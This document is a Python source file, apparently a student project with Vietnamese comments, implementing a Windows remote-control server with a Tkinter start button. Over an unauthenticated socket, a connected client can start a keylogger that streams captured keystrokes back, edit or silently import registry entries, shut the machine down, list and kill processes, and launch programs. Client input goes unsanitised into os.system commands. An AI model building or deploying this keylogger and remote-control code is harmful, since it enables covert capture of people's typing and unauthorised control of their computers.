import socket
import os
import tkinter as tk
import winreg
from io import BytesIO
from pynput.keyboard import Key, Listener     

def sendData(sock, msg):
    sock.sendall(bytes(msg, "utf8"))

def Line(lines):
    if (len(lines) > 0):
        res = lines[0]
        lines.pop(0)
        res = res.decode()
        res = res.replace("\n","")
        return res
    else:
        return "QUIT"

def receive(sock, lines):
    buffer = BytesIO()
    try:
        resp = sock.recv(100)       
    except:
        return              
    else:
        buffer.write(resp)          
        buffer.seek(0)              
        start_index = 0             
        for line in buffer:
            start_index += len(line)
            lines.append(line)       
        if start_index:
            buffer.seek(start_index)
            remaining = buffer.read()
            buffer.truncate(0)
            buffer.seek(0)
            buffer.write(remaining)
        else:
            buffer.seek(0, 2)

def receiveLine(sock, lines):
    receive(sock, lines)
    return Line(lines)

def shutdown(sock):
    try:
        os.system('shutdown /s')
    except OSError:
        sendData(sock, 0)

def baseRegistryKey(link):
    a = ""
    id = link.index('\\')
    if (id >= 0):
        tmp = link[0:id]
        if (tmp == "HKEY_CLASSIES_ROOT"):
            a = winreg.HKEY_CLASSES_ROOT
        elif (tmp == "HKEY_CURRENT_USER"):
            a = winreg.HKEY_CURRENT_USER
        elif (tmp == "HKEY_LOCAL_MACHINE"):
            a = winreg.HKEY_LOCAL_MACHINE
        elif (tmp == "HKEY_USERS"):
            a = winreg.HKEY_USERS
        elif (tmp == "HKEY_CURRENT_CONFIG"):
            a = winreg.HKEY_CURRENT_CONFIG
    return a

def getValue(link, valueName):
    a = baseRegistryKey(link)
    subKey = link[link.index('\\') + 1:len(link)]
    try:
        a = winreg.OpenKey(baseRegistryKey(link), subKey, 0)
    except OSError:
        return 0
    try:
        tmp = winreg.QueryValueEx(a, valueName)
        return tmp[0]
    except OSError:
        return 0

def setValue(link, valueName, value, typeValue):
    try:
        a = baseRegistryKey(link)
        subKey = link[link.index('\\') + 1:len(link)]
        a = winreg.OpenKey(baseRegistryKey(link), subKey, 0, winreg.KEY_SET_VALUE)
    except OSError:
        return 0
    kind = ""
    if (typeValue == "String"):
        kind = winreg.REG_SZ
    elif (typeValue == "Binary"):
        kind = winreg.REG_BINARY
    elif (typeValue == "DWORD"):
        kind = winreg.REG_DWORD
    elif (typeValue == "QWORD"):
        kind = winreg.REG_QWORD
    elif (typeValue == "Multi-String"):
        kind = winreg.REG_MULTI_SZ
    elif (typeValue == "Expandable String"):
        kind = winreg.REG_EXPAND_SZ
    else:
        return 0
    try:
        winreg.SetValueEx(a, valueName, 0, kind, value)
        return 1
    except OSError:
        return 0

def deleteValue(link, valueName):
    try:
        a = baseRegistryKey(link)
        subKey = link[link.index('\\') + 1:len(link)]
        a = winreg.OpenKey(baseRegistryKey(link), subKey, 0, winreg.KEY_SET_VALUE)
    except OSError:
        return 0
    try:
        winreg.DeleteValue(a, valueName)
        return 1
    except OSError:
        return 0

def deleteKey(link):
    key = baseRegistryKey(link)
    subKey = link[link.index('\\') + 1:len(link)]
    try:
        winreg.DeleteKey(key, subKey)
        return 1
    except OSError:
        return 0

def createKey(link):
    key = baseRegistryKey(link)
    subKey = link[link.index('\\') + 1:len(link)]
    try:
        winreg.CreateKey(key, subKey)
        return 1
    except OSError:
        return 0

def registry(sock, lines):
    s = ""
    fs = open("fileReg.reg", "w")
    fs.close()
    while (True):
        s = receiveLine(sock, lines)
        if (s == "REG"):
            data = sock.recv(4096)
            fin = open("fileReg.reg", "w")
            fin.write(data)
            fin.close()
            try:
                os.system('wmic process call create \'regedit.exe /s fileReg.reg\'')
                sendData(sock, 1)
            except OSError:
                sendData(sock, 0)
        elif (s == "SEND"):
            option = receiveLine(sock, lines)
            print(option)
            link = receiveLine(sock, lines)
            print(link)
            a = baseRegistryKey(link)
            if (a == ""):
                s = 0
            else:
                if (option == "Create key"):
                    s = createKey(link)
                elif (option == "Delete key"):
                    s = deleteKey(link)
                elif (option == "Get value"):
                    valueName = receiveLine(sock, lines)
                    s = getValue(link, valueName)
                elif (option == "Set value"):
                    valueName = receiveLine(sock, lines)
                    value = receiveLine(sock, lines)
                    typeValue = receiveLine(sock, lines)
                    s = setValue(link, valueName, value, typeValue)
                elif (option == "Delete value"):
                    valueName = receiveLine(sock, lines)
                    s = deleteValue(link, valueName)
                else:
                    s = 0
            sendData(sock, s)
            #print(s)
        else:
            return

def printKeys(sock, keys):
    data = ""
    for key in keys:
        k = str(key).replace("'", "")
        if k == "Key.space":
            k = " "
        if k == "Key.enter":
            k = "\n"
        if k == "Key.tab":
            k = "Tab"
        if k == "Key.backspace":
            k = ""
            data = data[0:len(data)-1]
        if k == "Tab":
            k = "    "
        if k == "Key.shift" or k == "Key.esc":
            k = ""
        data += k
    sendData(sock, data)
    #print(data)

def keylog(sock, lines):
    keys = []

    def on_press(key):
        keys.append(key)

    def on_release(key):
        if key == Key.esc:
            return False

    isHook = False
    listener = Listener()
    while (True):
        s = receiveLine(sock, lines)
        data = []
        if (s == "PRINT"):
            printKeys(sock, keys)
            keys.clear()
        elif (s == "HOOK"):
            if (isHook == False):
                isHook = True
                listener = Listener(on_press = on_press, on_release = on_release)
                listener.start()
        elif (s == "UNHOOK"):
            if (isHook == True):
                isHook = False
                listener.stop()
        else:
            if (isHook == True):
                isHook = False
                listener.stop()
            return


def takepic():
    pass

def process(sock, lines):
    while (True):
        s = receiveLine(sock, lines)
        if (s == "XEM"):
            process = os.popen('wmic process get Name, ProcessId, ThreadCount').read()
            sendData(sock, process + '\n')
            #print(process)
        elif (s == "KILL"):
            test = True
            while (test):
                s = receiveLine(sock, lines)
                if (s == "KILLID"):
                    id = receiveLine(sock, lines)
                    if (id != ""):
                        try:
                            listID = os.popen('wmic process get ProcessId').read()
                            listID = listID.split('\n')
                            if (id not in listID):
                                sendData(sock, 0)
                                #print("Lỗi\n")
                            else:
                                os.system('wmic process where ProcessId=%a delete'%(id))
                                sendData(sock, 1)
                                #print("Đã diệt process\n")
                        except:
                            sendData(sock, 0)
                            #print("Lỗi\n")  
                else:
                    test = False
        elif (s == "START"):
            test = True
            while (test):
                s = receiveLine(sock, lines)
                if (s == "STARTID"):
                    processName = receiveLine(sock, lines)
                    processName += '.exe'
                    processName = "\'" + processName + "\'"
                    try:
                        os.system('wmic process call create %s'%(processName))
                        sendData(sock, 1)
                        #print("Process đã được bật\n")
                    except:
                        sendData(sock, 0)
                        #print("Lỗi\n")
                else:
                    test = False
        else:
            break


def application(sock, lines):
    while (True):
        s = receiveLine(sock, lines)
        if (s == "XEM"):
            listApp = os.popen('powershell "gps | where {$_.MainWindowTitle } | select name, id, {$_.Threads.Count}').read()
            sendData(sock, listApp + '\n')
            #print(listApp + '\n')
        elif (s == "KILL"):
            test = True
            while (test):
                s = receiveLine(sock, lines)
                if (s == "KILLID"):
                    id = receiveLine(sock, lines)
                    if (id != ""):
                        try:
                            listID = os.popen('powershell "gps | where {$_.MainWindowTitle } | select id').read()
                            listID = listID.split('\n')
                            if (id not in listID):
                                sendData(sock, 0)
                                #print("Lỗi\n")
                            else:
                                os.system('wmic process where ProcessId=%a delete'%(id))
                                sendData(sock, 1)
                                #print("Đã diệt chương trình\n")
                        except:
                            sendData(sock, 0)  
                            #print("Lỗi\n")
                else:
                    test = False
        elif (s == "START"):
            test = True
            while (test):
                s = receiveLine(sock, lines)
                if (s == "STARTID"):
                    appName = receiveLine(sock, lines)
                    appName += '.exe'
                    appName = "\'" + appName + "\'"
                    try:
                        os.system('wmic process call create %s'%(appName))
                        sendData(sock, 1)
                        #print("Chương trình đã bật\n")
                    except:
                        sendData(sock, 0)
                        #print("Lỗi\n")
                else:
                    test = False
        else:
            break

hostname = socket.gethostname()
HOST = socket.gethostbyname(hostname)
PORT = 65432   

def buttonServer_click():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        try:
            #print('Connected by', addr)
            lines = []
            str = ""
            while True:
                str = receiveLine(conn, lines)
                if (str == "KEYLOG"):
                    keylog(conn, lines)
                elif (str == "REGISTRY"):
                    registry(conn, lines)
                elif (str == "SHUTDOWN"):
                    shutdown(conn)
                elif (str == "TAKEPIC"):
                    takepic()
                elif (str == "PROCESS"):
                    process(conn, lines)
                elif (str == "APPLICATION"):
                    application(conn, lines)
                else: # str == "QUIT"
                    conn.shutdown(socket.SHUT_RDWR)
                    break
        except KeyboardInterrupt:
            conn.shutdown(socket.SHUT_RDWR)

def run_server():
    window = tk.Tk()
    window.title("Form1")

    frame1 = tk.Frame(master=window, width=150, height=150)
    frame1.pack()

    button = tk.Button(master=window, text="Mở server", width=10, height=5, command=buttonServer_click)
    button.place(x=35, y=30)

    window.mainloop()

run_server()